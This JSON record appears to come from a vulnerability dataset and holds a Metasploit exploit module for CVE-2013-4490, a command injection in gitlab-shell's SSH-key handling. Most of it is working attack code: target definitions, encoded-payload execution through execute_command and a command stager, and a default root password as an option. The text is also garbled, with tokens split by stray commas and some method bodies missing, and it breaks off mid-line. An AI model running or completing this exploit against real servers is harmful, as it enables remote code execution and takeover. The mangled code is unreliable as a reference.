{
    "text": "vul_name : Gitlab-shell Code Execution ， vul_cve : CVE-2013-4490 ， vul_poc :  ，  # This module requires Metasploit : http/metasploit.com/download ，  # Current source :  ， require 'msf/core' ， require 'net/ssh' ， class Metasploit3 < Msf : Exploit : Remote ， Rank = ExcellentRanking ， include Msf : Exploit : Remote : HttpClient ， include Msf : Exploit : CmdStager ， super ( update_info ( info ,  ， 'Name' => 'Gitlab-shell Code Execution' ,  ， 'Description' => %q (  ， This module takes advantage of the addition of authorized ， ssh keys in the gitlab-shell functionality of Gitlab. Versions ， of gitlab-shell prior to 1.7.4 used the ssh key provided directly ， in a system call resulting in a command injection vulnerability. As ， this relies on adding an ssh key to an account valid credentials ， are required to exploit this vulnerability. ， 'Author' => ，  [  ， 'Brandon Knight' ，  ]  ,  ， 'License' => MSF_LICENSE ,  ， ' ，  [  ，  [ 'URL' , ' ，  [ 'CVE' , '2013-4490' ]  ，  ]  ,  ， 'Platform' => 'linux' ,  ， 'Targets' => ，  [  ，  [ 'Linux' ,  ， { ， 'Platform' => 'linux' ,  ， 'Arch' => ARCH_X86 ， } ，  ]  ,  ，  [ 'Linux ( x64 ) ' ,  ， { ， 'Platform' => 'linux' ,  ， 'Arch' => ARCH_X86_64 ， } ，  ]  ,  ，  [ 'Unix ( CMD ) ' ,  ， { ， 'Platform' => 'unix' ,  ， 'Arch' => ARCH_CMD ,  ， 'Payload' => ， { ， 'Compat' => ， { ， 'RequiredCmd' => 'openssl perl python' ， } ,  ， 'BadChars' => \"\\x22\" ， } ， } ，  ]  ,  ，  [ 'Python' ,  ， { ， 'Platform' => 'python' ,  ， 'Arch' => ARCH_PYTHON ,  ， 'Payload' => ， { ， 'BadChars' => \"\\x22\" ， } ， } ，  ]  ，  ]  ,  ， 'CmdStagerFlavor' => %w ( bourne printf )  ,  ， 'DisclosureDate' => 'Nov 4 2013' ,  ， 'DefaultTarget' => 0 )  ， register_options (  ，  [  ， OptString.new ( 'USERNAME' ,  [ true , 'The username to authenticate as' , 'root' ]  )  ,  ， OptString.new ( 'PASSWORD' ,  [ true , 'The password for the specified username' , '5iveL ! fe' ]  )  ,  ， OptString.new ( 'TARGETURI' ,  [ true , 'The path to Gitlab' , '/' ]  )  ，  ]  , self.class )  ， end ， def exploit ， login ， case target [ 'Platform' ]  ， when 'unix' ， execute_command ( payload.encoded )  ， when 'python' ， execute_command ( \"python -c \\\" # {payload.encoded}\\\" )  ， when 'linux' ， execute_cmdstager ( temp : './' , linemax : 2800 )  ， end ， end ， key_id = add_key ( cmd )  ， delete_key ( key_id )  ， end ， def check ， res = send_request_cgi ( 'uri' => normalize_uri ( target_uri.path.to_s , 'users' , 'sign_in' ) ",
    "time": "2014.08.19"
}